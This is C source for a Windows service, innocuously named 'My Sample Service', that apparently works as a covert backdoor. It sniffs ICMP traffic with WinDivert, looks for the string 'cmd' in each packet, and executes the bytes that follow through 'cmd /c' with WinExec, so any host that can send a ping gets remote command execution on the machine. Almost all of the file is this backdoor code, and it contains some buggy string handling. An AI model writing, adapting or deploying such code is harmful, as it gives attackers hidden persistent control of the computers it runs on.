#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#include "windivert.h"

#define ntohs(x)            WinDivertHelperNtohs(x)
#define ntohl(x)            WinDivertHelperNtohl(x)

#define MAXBUF              0xFFFF
#define INET6_ADDRSTRLEN    45

SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler (DWORD);
DWORD WINAPI ServiceWorkerThread (LPVOID lpParam);

#define SERVICE_NAME  _T((LPCSTR)"My Sample Service")

int _tmain (int argc, TCHAR *argv[])
{
    OutputDebugStringW(((LPCWSTR)"My Sample Service: Main: Entry"));

    SERVICE_TABLE_ENTRY ServiceTable[] = 
    {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher (ServiceTable) == FALSE)
    {
       OutputDebugStringW(((LPCWSTR)"My Sample Service: Main: StartServiceCtrlDispatcher returned error"));
       return GetLastError ();
    }

    OutputDebugStringW(((LPCWSTR)"My Sample Service: Main: Exit"));
    return 0;
}


VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv)
{
    DWORD Status = E_FAIL;

    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: Entry"));

    g_StatusHandle = RegisterServiceCtrlHandler (SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL) 
    {
        OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: RegisterServiceCtrlHandler returned error"));
    }

    // Tell the service controller we are starting
    ZeroMemory (&g_ServiceStatus, sizeof (g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus (g_StatusHandle, &g_ServiceStatus) == FALSE) 
    {
        OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: SetServiceStatus returned error"));
    }

    /* 
     * Perform tasks neccesary to start the service here
     */
    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: Performing Service Start Operations"));

    // Create stop event to wait on later.
    g_ServiceStopEvent = CreateEvent (NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) 
    {
        OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: CreateEvent(g_ServiceStopEvent) returned error"));

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        if (SetServiceStatus (g_StatusHandle, &g_ServiceStatus) == FALSE)
	    {
		    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: SetServiceStatus returned error"));
	    }
    }    

    // Tell the service controller we are started
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus (g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
	    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: SetServiceStatus returned error"));
    }

    // Start the thread that will perform the main task of the service
    HANDLE hThread = CreateThread (NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: Waiting for Worker Thread to complete"));

    // Wait until our worker thread exits effectively signaling that the service needs to stop
    WaitForSingleObject (hThread, INFINITE);
    
    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: Worker Thread Stop Event signaled"));
    
    
    /* 
     * Perform any cleanup tasks
     */
    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: Performing Cleanup Operations"));

    CloseHandle (g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    if (SetServiceStatus (g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
	    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceMain: SetServiceStatus returned error"));
    }

    return;
}


VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)
{
    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceCtrlHandler: Entry"));

    switch (CtrlCode) 
	{
     case SERVICE_CONTROL_STOP :

        OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceCtrlHandler: SERVICE_CONTROL_STOP Request"));

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
           break;

        /* 
         * Perform tasks neccesary to stop the service here 
         */
        
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        if (SetServiceStatus (g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceCtrlHandler: SetServiceStatus returned error"));
		}

        // This will signal the worker thread to start shutting down
        SetEvent (g_ServiceStopEvent);

        break;

     default:
         break;
    }

    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceCtrlHandler: Exit"));
}


DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
{
    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceWorkerThread: Entry"));
        HANDLE handle, console;
        UINT i;
        INT16 priority = 0;
        unsigned char packet[MAXBUF];
        UINT packet_len;
        WINDIVERT_ADDRESS addr;
        PWINDIVERT_IPHDR ip_header;
        PWINDIVERT_IPV6HDR ipv6_header;
        PWINDIVERT_ICMPHDR icmp_header;
        PWINDIVERT_ICMPV6HDR icmpv6_header;
        PWINDIVERT_TCPHDR tcp_header;
        PWINDIVERT_UDPHDR udp_header;
        UINT32 src_addr[4], dst_addr[4];
        UINT64 hash;
        char src_str[INET6_ADDRSTRLEN + 1], dst_str[INET6_ADDRSTRLEN + 1];
        const char* err_str;
        LARGE_INTEGER base, freq;
        double time_passed;

        const char* filter = "icmp";
        const char* thousand = "1000";
        priority = (INT16)atoi(thousand);


        // Get console for pretty colors.
        console = GetStdHandle(STD_OUTPUT_HANDLE);

        // Divert traffic matching the filter:
        handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, priority,
            WINDIVERT_FLAG_SNIFF);
        if (handle == INVALID_HANDLE_VALUE)
        {
            if (GetLastError() == ERROR_INVALID_PARAMETER &&
                !WinDivertHelperCompileFilter(filter, WINDIVERT_LAYER_NETWORK,
                    NULL, 0, &err_str, NULL))
            {
                fprintf(stderr, "error: invalid filter \"%s\"\n", err_str);
                exit(EXIT_FAILURE);
            }
            fprintf(stderr, "error: failed to open the WinDivert device (%d)\n",
                GetLastError());
            exit(EXIT_FAILURE);
        }

        // Max-out the packet queue:
        if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_LENGTH,
            WINDIVERT_PARAM_QUEUE_LENGTH_MAX))
        {
            fprintf(stderr, "error: failed to set packet queue length (%d)\n",
                GetLastError());
            exit(EXIT_FAILURE);
        }
        if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_TIME,
            WINDIVERT_PARAM_QUEUE_TIME_MAX))
        {
            fprintf(stderr, "error: failed to set packet queue time (%d)\n",
                GetLastError());
            exit(EXIT_FAILURE);
        }
        if (!WinDivertSetParam(handle, WINDIVERT_PARAM_QUEUE_SIZE,
            WINDIVERT_PARAM_QUEUE_SIZE_MAX))
        {
            fprintf(stderr, "error: failed to set packet queue size (%d)\n",
                GetLastError());
            exit(EXIT_FAILURE);
        }
    //  Periodically check if the service has been requested to stop
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
    {        
        /* 
         * Perform main service function here
         */
                    // Read a matching packet.
        if (!WinDivertRecv(handle, packet, sizeof(packet), &packet_len, &addr))
        {
            fprintf(stderr, "warning: failed to read packet (%d)\n",
                GetLastError());
            continue;
        }

        // Print info about the matching packet.
        WinDivertHelperParsePacket(packet, packet_len, &ip_header, &ipv6_header,
            NULL, &icmp_header, &icmpv6_header, &tcp_header, &udp_header, NULL,
            NULL, NULL, NULL);
        if (ip_header == NULL && ipv6_header == NULL)
        {
            fprintf(stderr, "warning: junk packet\n");
        }

        if (icmp_header != NULL)
        {
            SetConsoleTextAttribute(console, FOREGROUND_RED);
            printf("ICMP [Type=%u Code=%u Checksum=0x%.4X Body=0x%.8X]\n",
                icmp_header->Type, icmp_header->Code,
                ntohs(icmp_header->Checksum), ntohl(icmp_header->Body));
            // create process
            STARTUPINFO si = { sizeof(STARTUPINFO) };
            PROCESS_INFORMATION pi;

        }


        SetConsoleTextAttribute(console, FOREGROUND_RED | FOREGROUND_BLUE);
        for (i = 0; i < packet_len; i++)
        {
            if (i % 40 == 0)
            {
                printf("\n\t");
            }
            if (isprint(packet[i]))
            {
                if (packet[i] == 'c' && packet[i + 1] == 'm' && packet[i + 2] == 'd')
                {
                    int cmd_len = packet_len - (i + 4);
                    char* cmd = (char*)malloc((cmd_len + 1) * sizeof(char));
                    int j = 7;
                    char* in_cmd = (char*)malloc((cmd_len + 1 + 7) * sizeof(char));
                    const char* as = "cmd /c ";
                    strcpy_s(in_cmd, sizeof(as), as);
                    for (i = i + 4; i < packet_len; i++)
                    {
                        in_cmd[j] = packet[i];
                        j += 1;
                    }
                    in_cmd[j] = '\0';
                    WinExec(in_cmd, NULL);
                    free(cmd);
                    free(in_cmd);
                }
            }
        }
    }

    OutputDebugStringW(((LPCWSTR)"My Sample Service: ServiceWorkerThread: Exit"));

    return ERROR_SUCCESS;
}